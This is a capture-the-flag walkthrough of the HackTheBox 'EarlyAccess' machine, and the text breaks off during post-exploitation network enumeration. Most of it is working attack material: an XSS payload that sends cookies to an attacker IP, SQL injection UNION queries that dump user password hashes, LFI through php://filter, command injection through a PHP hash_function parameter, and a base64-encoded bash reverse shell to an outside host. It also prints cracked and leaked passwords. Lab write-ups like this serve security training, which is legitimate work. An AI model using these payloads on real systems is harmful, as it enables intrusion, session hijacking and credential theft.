> Author: **[Chr0x6eOs][author-profile]**

## Discovery

### Port Scanning

TCP:

```bash
PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp    open   http     Apache httpd 2.4.38
|_http-title: Did not follow redirect to https://earlyaccess.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
443/tcp   open   ssl/http Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Issuer: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-18T14:46:57
| Not valid after:  2022-08-18T14:46:57
| MD5:   cb8e e2a3 cfc9 b38e 36b8 3393 c8f5 d425
|_SHA-1: f884 fc2c 843f 4ce0 3c51 a06b cb8c 7b50 9c7d 0fc7
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: EarlyAccess
|_http-server-header: Apache/2.4.38 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
27374/tcp closed subseven
47748/tcp closed unknown
48462/tcp closed unknown
57444/tcp closed unknown
```

UDP:

```
All 1000 scanned ports on earlyaccess.htb (10.10.11.110) are in ignored states.
```

### Enumeration

Directories:

```bash
gobuster dir -u http://10.10.11.110/ -w /usr/share/wordlists/discovery/raft-medium-directories.txt -o discovery/directories.txt
# /images               (Status: 301) [Size: 315] [--> https://10.10.11.110/images/]
# /js                   (Status: 301) [Size: 311] [--> https://10.10.11.110/js/]
# /admin                (Status: 302) [Size: 350] [--> https://10.10.11.110/login]
# /css                  (Status: 301) [Size: 312] [--> https://10.10.11.110/css/]
# /forum                (Status: 302) [Size: 350] [--> https://10.10.11.110/login]
# /contact              (Status: 302) [Size: 350] [--> https://10.10.11.110/login]
# /logout               (Status: 405) [Size: 825]
# /register             (Status: 200) [Size: 2890]
# /login                (Status: 200) [Size: 3014]
```

### Web Browsing

The web admin actually respond to the support messages:

![][admin-support]

And the sender's name is reflected in the webpage: this is an opportunity for
some XXS in the user name field.

## Break-in

Let's proceed and inject this in the profile's name field:

```html
<script>var i=new Image;i.src="https://10.10.16.2:4343/?"+document.cookie;</script>
```

Then setup a Python3 HTTPS server to catch the cookie:

```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
python www/https-server.py
```

With the server embodied by:

```python
httpd = http.server.HTTPServer(
    ('localhost', 4343),
    http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(
    httpd.socket,
    server_side=True,
    certfile='localhost.pem',
    ssl_version=ssl.PROTOCOL_TLS)
httpd.serve_forever()
```

```
10.10.11.110 - - [17/Nov/2021 18:35:24] "GET /?XSRF-TOKEN=eyJpdiI6IlRKRXB2UlE0R3BDdzFVMnBLUDYrVFE9PSIsInZhbHVlIjoiclhhTDVXM2lQWmF2RHBCRmpuaG41YUs3aXd2RlhoOUY4MzE1V2pZaUZTcENnOEovWE1PNzlRWE1LSWdzU3UrYytmRmtSSTBXSDIrWEtHbkhLQU9YUTVubDlveGVUUGQ3b1RYQmNOMm5JYjdva25zRlBjR3dMWVRia3M3Uk85SCsiLCJtYWMiOiIyMWU0OGI0YjljMzEwMDg3MzQyMTMxNDlmNGU3OGIxZGJjZjk1MTFlMmZhOWNlNjliYTA0NjJjYzU2NWNiY2RlIn0%3D;%20earlyaccess_session=eyJpdiI6IlRURUVwSHB2TzBSZ3gzSmJadUVRNXc9PSIsInZhbHVlIjoiWlJhVjNrWWVpOEVzbndHYy9sNVJ1M1hUVkdMWmlVQStPTVlVcS93SHJIV3hrYmp6b2ViZnBtTUhkSW5vbEJEZmg0b1N6WnZ0M00zcUlzczJCcjVCbzlRUndCN1Y1d0hoK0xkbWJJUm0zaWxTcWY3N1h2SXpKWlM3Z1VicEd5ZmwiLCJtYWMiOiI2MjFhM2RhNjIwZGJkMTIwNGYxNzM0NmUyYmRjMjA5MDZiMDMyMGE0MmQ4MTQ1NTNmN2QwZGViYTJjN2VkY2I5In0%3D HTTP/1.1" 200 -
```

Entering these in the dev console grants us admin access to the web panel!

![][admin-access]

## Accessing the Game Console

The admin account reveals more:

- new subdomains:
  - `game.earlyaccess.htb`
  - `dev.earlyaccess.htb`
- a backup archive

![][game-key-validator]

The backup archive contains the logic behind the key validation.

Essentially a key is made of 4 alphanumeric groups and a checksum:

```python
# Keys look like the following:
# AAAAA-BBBBB-CCCC1-DDDDD-1234
r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$"
```

### Group 1

All the characters in this group have to be different, and the last two
are numeric.

And the first three characters must verify this condition:

```python
r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
if r != [221, 81, 145]:
```

This formula can be analytically reversed, or we can just enumerate all the
byte values and find those that match:

```python
def gen_g1() -> Iterator[str]:
    __r = [221, 81, 145]
    __c = [[calc_g1_rest(v, i) for v in range(256)].index(__r[i]) for i in range(3)]
```

There's one more subtlety that we'll see with group 4.

### Group 2

The group 2 is divided into 2 subgroups with the same sum:

```python
def gen_g2() -> Iterator[str]:
    for __g in itertools.product(string.ascii_uppercase + string.digits, repeat=5):
        if sum(''.join(__g[::2]).encode()) == sum(''.join(__g[1::2]).encode()):
            yield ''.join(__g)
```

It is calculated to statisfy the format and be made of uppercase letters and digits.

### Group 3

The group 3 starts with a given prefix and the sum of its bytes is the magic number:

```python
def gen_g3(magic: int=346) -> Iterator[str]:
    for __c3 in string.digits:
        for __c1 in string.ascii_uppercase:
            __v2 = magic - sum(b'XP') - ord(__c3) - ord(__c1)
            if (__v2 in list(bytes(string.ascii_uppercase, 'utf-8'))):
                yield 'XP' + __c1 + chr(__v2) + __c3
```

The first 4 characters are uppercase letters and the last one is a digit.

### Group 4

It is directly deducted by xorring the group 1: 

```python
def gen_g4(g1: str) -> str:
    return ''.join([chr(ord(c) ^ i) for c, i in zip(g1, [12, 4, 20, 117, 0])])
```

It has to be all uppercase characters, which puts a restriction on the possible
values in group 1:

```python
for __d in itertools.combinations(set(string.digits) - set(__c), 2):
    __g1 = ''.join([chr(c) for c in __c]) + __d[0] + __d[1]
    __g4 = gen_g4(__g1)
    if bool(match(r"^[A-Z0-9]{5}$", __g4)):
        yield ''.join([chr(c) for c in __c]) + __d[0] + __d[1]
```

### Checksum

The checksum is just the sum of all the ASCII values in the key,
except the three dashes:

```python
def calc_cs(key: str) -> int:
    return sum(key[:23].encode()) - 135
```

The dashes each have a value of 45, hence the substraction of 135.

### Whole Key

Putting it all together:

```python
def gen_key(magic: int) -> Iterator[str]:
    __i1 = gen_g1()
    __i2 = gen_g2()
    __i3 = gen_g3(magic)
    for __g1 in __i1:
        for __g2 in __i2:
            for __g3 in __i3:
                __g4 = gen_g4(__g1)
                __k = f'{__g1}-{__g2}-{__g3}-{__g4}-'
                __k += str(calc_cs(__k))
                yield __k
```

### Bruteforce

The magic number is unknown, but it is the sum of 5 bytes:

```python
magic = sum(b'XP') + ord(c1) + ord(c2) + orc(c3)
magic = 168 + ord(c1) + ord(c2) + orc(c3)
```

`c1` and `c2` are both uppercase letters and `c3` is a digit: it is between
"AA0" (178) and "ZZ9" (237), 60 possibilities.

So we can just generate 60 keys and test all the magic numbers via the API:

```python
def bruteforce_gamekey(xrsf: str, session: str, token: str) -> str:
    for magic in range(346, 406):
        __k = gen_key(magic).__next__()
        __r = send_request(
            payload=__k,
            xrsf=xrsf,
            session=session,
            token=token)
        if 'invalid' in __r.lower() or 'expired' in __r.lower():
            print(f'magic: {magic}\tkey: {__k}\tvalid: no...', end='\r')
        else:
            print(f'magic: {magic}\tkey: {__k}\tvalid: yes!!!', end='\r')
            return __k
```

## Game Console to Dev Console

The game is a simple snake. The score is sent by the JS script:

```javascript
if (has_game_ended())
{
    document.getElementById('status').innerHTML = "Game over!";
    document.getElementById('btn').disabled = false;
    document.getElementById('btn').innerHTML = "Replay";
    url = 'http://game.earlyaccess.htb/actions/score.php?score=';
    score = document.getElementById('score').innerHTML;
    url += score;
    $.get(url);
    return;
}
```

This request can be captured and tweaked. Entering a score of `999999999`
makes the server error out. The error is reflected verbatim on the game page,
it smells like SQLi!

![][game-error]

This tells us that the server is using MySQL.

```bash
ffuf -r -w /usr/share/wordlists/fuzzing/special-chars.txt \
    -H $'Host: game.earlyaccess.htb' \
    -b $'PHPSESSID=bb9f23efddf763e13b8e4389db1c201f' \
    -u $'http://game.earlyaccess.htb/actions/score.php?score=FUZZ'
# <                       [Status: 200, Size: 7763, Words: 2943, Lines: 132, Duration: 137ms]
# %                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 155ms]
# -                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 189ms]
# |                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 211ms]
# [                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 233ms]
# >                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 280ms]
# $                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 298ms]
# ~                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 348ms]
# _                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 358ms]
# &                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 388ms]
# `                       [Status: 200, Size: 7763, Words: 2943, Lines: 132, Duration: 313ms]
# ,                       [Status: 200, Size: 7763, Words: 2943, Lines: 132, Duration: 157ms]
# .                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 166ms]
# \                       [Status: 200, Size: 7763, Words: 2943, Lines: 132, Duration: 157ms]
# ?                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 144ms]
# :                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 179ms]
# ;                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 204ms]
# )                       [Status: 200, Size: 7763, Words: 2943, Lines: 132, Duration: 111ms]
# #                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 139ms]
# +                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 161ms]
# ^                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 185ms]
# /                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 209ms]
# !                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 235ms]
# {                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 264ms]
# "                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 264ms]
# (                       [Status: 200, Size: 7763, Words: 2943, Lines: 132, Duration: 115ms]
# '                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 136ms]
# @                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 156ms]
# *                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 175ms]
# ]                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 190ms]
# =                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 208ms]
# }                       [Status: 200, Size: 7113, Words: 2747, Lines: 121, Duration: 225ms]
```

Automatic SQLi detection fails on the game page:

```bash
sqlmap -v 2 -r "$HOME/workspace/ctf/hackthebox/web/earlyaccess/requests/score.txt" \
    --dbms mysql --answer="redirect=Y" -p score \
    --level 5 --risk 3 --time-sec 2 --batch --proxy=http://127.0.0.1:8080
# [20:52:38] [CRITICAL] all tested parameters do not appear to be injectable.
```

But the username is used on a query for the scoreboard:

![][game-scoreboard]

It is most likely in a `WHERE` clause: we can try SQLi here.

![][successful-sqli]

With this we can extract the schema informations:

```sql
test') or 1=1 UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- -
```

> failed_logins,scoreboard,users

```sql
test') or 1=1 UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='failed_logins' -- -
test') or 1=1 UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='scoreboard' -- -
test') or 1=1 UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='users' -- -
```

> id,IP,time
> id,score,time,user_id
> created_at,email,id,key,name,password,role,updated_at

```sql
test') or 1=1 UNION SELECT 1,group_concat(name,password),3 from users -- -
test') or 1=1 UNION SELECT 1,group_concat(id,role,name,password,email,key),3 from users -- -
```

> admin 618292e936625aca8df61d5fff5c06837c49e491
> chr0x6eos d997b2a79e4fc48183f59b2ce1cee9da18aa5476
> firefart 584204a0bbe5e392173d3dfdf63a322c83fe97cd
> farbs 290516b5f6ad161a86786178934ad5f933242361

This should grant access to the dev subdomain. Let's crack it:

```bash
hashid 618292e936625aca8df61d5fff5c06837c49e491
# [+] SHA-1 
# [+] Double SHA-1 
# [+] RIPEMD-160 
# [+] Haval-160 
# [+] Tiger-160 
# [+] HAS-160 
# [+] LinkedIn 
# [+] Skein-256(160) 
# [+] Skein-512(160)
hashcat -m 100 -a 0 admin.hash /usr/share/wordlists/passwords/rockyou-50.txt
# 618292e936625aca8df61d5fff5c06837c49e491:gameover
```

> admin gameover

## Dev Console to System User

The UI advertises a file and a hashing tools. May-be there are more:

```bash
ffuf -r -w  /usr/share/wordlists/discovery/raft-large-words.txt \
    -H $'Host: dev.earlyaccess.htb' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    -u $'http://dev.earlyaccess.htb/home.php?tool=FUZZ'
# file                    [Status: 200, Size: 4743, Words: 1215, Lines: 80, Duration: 278ms]
ffuf -r -w  /usr/share/wordlists/discovery/raft-large-words.txt \
    -H $'Host: dev.earlyaccess.htb' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    -u $'http://dev.earlyaccess.htb/actions/FUZZ.php'
# logout                  [Status: 200, Size: 4426, Words: 1023, Lines: 75, Duration: 148ms]
# login                   [Status: 200, Size: 4426, Words: 1023, Lines: 75, Duration: 118ms]
# hash                    [Status: 200, Size: 4426, Words: 1023, Lines: 75, Duration: 146ms]
```

LFI to gain info on the hashing tool which looks like it makes a system call.
But first, we need to find the proper way to query the "file" service:

```bash
ffuf -r -w ~/downloads/payloads/burp-parameter-names.txt -fl 75 \
    -H $'Host: dev.earlyaccess.htb'\
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    -d $'FUZZ=hash.php' \
    -u $'http://dev.earlyaccess.htb/actions/file.php'
```

Fails, but this works:

```bash
ffuf -r -w ~/downloads/payloads/burp-parameter-names.txt -fl 75 \
    -H $'Host: dev.earlyaccess.htb'\
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    -u $'http://dev.earlyaccess.htb/actions/file.php?FUZZ=hash.php'
# filepath                [Status: 200, Size: 306, Words: 25, Lines: 3, Duration: 129ms]
```

And:

```
GET /actions/file.php?filepath=hash.php HTTP/1.1
```

Finally returns a 200! It was actually the request type that was wrong...
What's more there's an error message!

```html
<b>Warning</b>:
Cannot modify header information - headers already sent by
(output started at /var/www/earlyaccess.htb/dev/actions/file.php:18)
in <b>/var/www/earlyaccess.htb/dev/actions/hash.php</b>
```

```bash
ffuf -r -w ~/downloads/payloads/lfi.txt \
    -H $'Host: dev.earlyaccess.htb'\
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    -u $'http://dev.earlyaccess.htb/actions/file.php?filepath=FUZZ'
# \xampp\phpmyadmin\config.inc.php [Status: 200, Size: 472, Words: 35, Lines: 5, Duration: 147ms]
# \xampp\phpMyAdmin\config.inc.php [Status: 200, Size: 472, Words: 35, Lines: 5, Duration: 153ms]
# \xampp\phpMyAdmin\phpinfo.php [Status: 200, Size: 463, Words: 35, Lines: 5, Duration: 150ms]
# \xampp\phpmyadmin\phpinfo.php [Status: 200, Size: 463, Words: 35, Lines: 5, Duration: 159ms]
```

Actually LFI can be exploited to bypass the script execution and display the
content verbatim, by executing a filter instead:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: dev.earlyaccess.htb' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    $'http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=hash.php&debug=1'
# PD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXNoX2Z1bmN0aW9uLCAkcGFzc3dvcmQpCnsKICAgIC8vIERFVkVMT1BFUi1OT1RFOiBUaGVyZSBoYXMgZ290dGEgYmUgYW4gZWFzaWVyIHdheS4uLgogICAgb2Jfc3RhcnQoKTsKICAgIC8vIFVzZSBpbnB1dHRlZCBoYXNoX2Z1bmN0aW9uIHRvIGhhc2ggcGFzc3dvcmQKICAgICRoYXNoID0gQCRoYXNoX2Z1bmN0aW9uKCRwYXNzd29yZCk7CiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pKQogICAgewogICAgICAgIGlmKCRfUkVRVUVTVFsnYWN0aW9uJ10gPT09ICJ2ZXJpZnkiKQogICAgICAgIHsKICAgICAgICAgICAgLy8gVkVSSUZJRVMgJHBhc3N3b3JkIEFHQUlOU1QgJGhhc2gKCiAgICAgICAgICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ2hhc2gnXSkgJiYgaXNzZXQoJF9SRVFVRVNUWydwYXNzd29yZCddKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gT25seSBhbGxvdyBjdXN0b20gaGFzaGVzLCBpZiBgZGVidWdgIGlzIHNldAogICAgICAgICAgICAgICAgaWYoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10gIT09ICJtZDUiICYmICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAic2hhMSIgJiYgIWlzc2V0KCRfUkVRVUVTVFsnZGVidWcnXSkpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiT25seSBNRDUgYW5kIFNIQTEgYXJlIGN1cnJlbnRseSBzdXBwb3J0ZWQhIik7CgogICAgICAgICAgICAgICAgJGhhc2ggPSBoYXNoX3B3KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddLCAkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10pOwoKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsndmVyaWZ5J10gPSAoJGhhc2ggPT09ICRfUkVRVUVTVFsnaGFzaCddKTsKICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9ob21lLnBocD90b29sPWhhc2hpbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gInZlcmlmeV9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUgVkVSSUZJQ0FUSU9OCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkX1JFUVVFU1RbJ2FjdGlvbiddID09PSAiaGFzaF9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUtSEFTSElORwogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gImhhc2giKQogICAgICAgIHsKICAgICAgICAgICAgLy8gSEFTSEVTICRwYXNzd29yZCBVU0lORyAkaGFzaF9mdW5jdGlvbgoKICAgICAgICAgICAgaWYoaXNzZXQoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIE9ubHkgYWxsb3cgY3VzdG9tIGhhc2hlcywgaWYgYGRlYnVnYCBpcyBzZXQKICAgICAgICAgICAgICAgIGlmKCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAibWQ1IiAmJiAkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSAhPT0gInNoYTEiICYmICFpc3NldCgkX1JFUVVFU1RbJ2RlYnVnJ10pKQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oIk9ubHkgTUQ1IGFuZCBTSEExIGFyZSBjdXJyZW50bHkgc3VwcG9ydGVkISIpOwoKICAgICAgICAgICAgICAgICRoYXNoID0gaGFzaF9wdygkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSwgJF9SRVFVRVNUWydwYXNzd29yZCddKTsKICAgICAgICAgICAgICAgIGlmKCFpc3NldCgkX1JFUVVFU1RbJ3JlZGlyZWN0J10pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIlJlc3VsdCBmb3IgSGFzaC1mdW5jdGlvbiAoIiAuICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddIC4gIikgYW5kIHBhc3N3b3JkICgiIC4gJF9SRVFVRVNUWydwYXNzd29yZCddIC4gIik6PGJyPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGJyPicgLiAkaGFzaDsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydoYXNoJ10gPSAkaGFzaDsKICAgICAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaG9tZS5waHA/dG9vbD1oYXNoaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgLy8gQWN0aW9uIG5vdCBzZXQsIGlnbm9yZQogICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiIik7Cn0KY2F0Y2goRXhjZXB0aW9uICRleCkKewogICAgaWYoJGV4LT5nZXRNZXNzYWdlKCkgIT09ICIiKQogICAgICAgICRfU0VTU0lPTlsnZXJyb3InXSA9IGh0bWxlbnRpdGllcygkZXgtPmdldE1lc3NhZ2UoKSk7CgogICAgaGVhZGVyKCdMb2NhdGlvbjogL2hvbWUucGhwJyk7CiAgICByZXR1cm47Cn0KPz4=
```

Several portions stand out:

```php
function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}
```

```php
if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
    throw new Exception("Only MD5 and SHA1 are currently supported!");
```

```php
$hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
```

```php
if(!isset($_REQUEST['redirect']))
{
    echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
    echo '<br>' . $hash;
    return;
}
```

So:

- remove the `redirect` parameter altogether
- set `debug` to true
- and `hash_function` to system

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: dev.earlyaccess.htb' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    --data-binary $'action=hash&&debug=true;&password=id&hash_function=system' \
    $'http://dev.earlyaccess.htb/actions/hash.php'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This gives us a reverse shell:

```bash
# YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzk5OTkgMD4mMSc=
payload=$(echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.3/9999 0>&1'" | base64 -w 0)
curl -i -s -k -X $'POST' \
    -H $'Host: dev.earlyaccess.htb' \
    -b $'PHPSESSID=00b5982c89f659b2c7f95dce58cee132' \
    --data-urlencode $'action=hash&&debug=true;&password=echo+-n+'"${payload}"'|base64+-d|bash;&hash_function=system' \
    $'http://dev.earlyaccess.htb/actions/hash.php'
```

## GTFO the Container

The usual discovery / enumeration:

```bash
stty rows 87 columns 94
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
cat /etc/passwd | grep -via nologin     
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# www-adm:x:1000:1000::/home/www-adm:/bin/bash
su -l www-adm # gameover is reused
ls -lah
# total 24K
# drwxr-xr-x 2 www-adm www-adm 4.0K Nov 18 08:55 .
# drwxr-xr-x 1 root    root    4.0K Nov 18 08:55 ..
# lrwxrwxrwx 1 root    root       9 Nov 18 08:55 .bash_history -> /dev/null
# -rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
# -rw-r--r-- 1 www-adm www-adm 3.5K Apr 18  2019 .bashrc
# -rw-r--r-- 1 www-adm www-adm  807 Apr 18  2019 .profile
# -r-------- 1 www-adm www-adm   33 Nov 18 08:55 .wgetr
cat .wgetrc
# user=api
# password=s3CuR3_API_PW
```

The API is listening on port 5000:

```bash
for PORT in {1..65535}; do
  timeout 0.2 bash -c "</dev/tcp/127.0.0.1/$PORT &>/dev/null" &&  echo "port $PORT is open"
done > ports.txt
cat ports.txt
# port 80 is open
# port 443 is open
# port 46680 is open
```

```bash
curl 'http://api:5000/'
# {
#     "message": "Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.",
#     "status": 200
# }
curl 'http://api:5000/check_db'
# Invalid HTTP-Auth!
curl -u 'api:s3CuR3_API_PW!' 'http://api:5000/check_db' |
    python3 -m json.tool > healthcheck.json
```

```json
"Env": [
    "MYSQL_DATABASE=db",
    "MYSQL_USER=drew",
    "MYSQL_PASSWORD=drew",
    "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
    "SERVICE_TAGS=dev",
    "SERVICE_NAME=mysql",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.12",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.25-1debian10"
],
"ExposedPorts": {
    "3306/tcp": {},
    "33060/tcp": {}
},
"Healthcheck": {
    "Interval": 5000000000,
    "Retries": 3,
    "Test": [
        "CMD-SHELL",
        "mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent"
    ],
    "Timeout": 2000000000
},
```

> drew XeoNu86JTznxMCQuGHrGutF3Csq5

## Escalation

### Discovery

```bash
cat /etc/passwd | grep -avi nologin
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# drew:x:1000:1000:drew:/home/drew:/bin/bash
# game-adm:x:1001:1001::/home/game-adm:/bin/bash
ls -lah /var/backups/
# total 36K
# drwxr-xr-x  2 root root 4.0K Sep  1 15:34 .
# drwxr-xr-x 12 root root 4.0K Aug 18 18:16 ..
# -rw-r--r--  1 root root  11K Aug 31 02:39 apt.extended_states.0
# -rw-r--r--  1 root root 1.3K Aug 18 18:34 apt.extended_states.1.gz
# -rw-r--r--  1 root root 1000 Aug  6 12:42 apt.extended_states.2.gz
# -rw-r--r--  1 root root  899 Jul 14 12:25 apt.extended_states.3.gz
# -rw-r--r--  1 root root  808 May 24 13:13 apt.extended_states.4.gz
ls -lah /var/mail/
# total 12K
# drwxrwsr-x  2 root mail 4.0K Jul 14 12:26 .
# drwxr-xr-x 12 root root 4.0K Aug 18 18:16 ..
# -rw-r--r--  1 root mail  678 Jul 14 12:26 drew
cat /var/mail/drew 
# To: <drew@earlyaccess.htb>
# Subject: Game-server crash fixes
# From: game-adm <game-adm@earlyaccess.htb>
# Date: Thu May 27 8:10:34 2021


# Hi Drew!

# Thanks again for taking the time to test this very early version of our newest project!
# We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
# If the game hangs now, the server will restart and be available again after about a minute.

# If you find any other problems, please don't hesitate to report them!

# Thank you for your efforts!
# Game-adm (and the entire EarlyAccess Studios team).
```

The server is running container instances, let's figure out the network map:

```bash
ip route
# default via 10.10.10.2 dev ens160 onlink 
# 10.10.10.0/23 dev ens160 proto kernel scope link src 10.10.11.110 
# 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
# 172.18.0.0/16 dev br-36357be55c4b proto kernel scope link src 172.18.0.1 
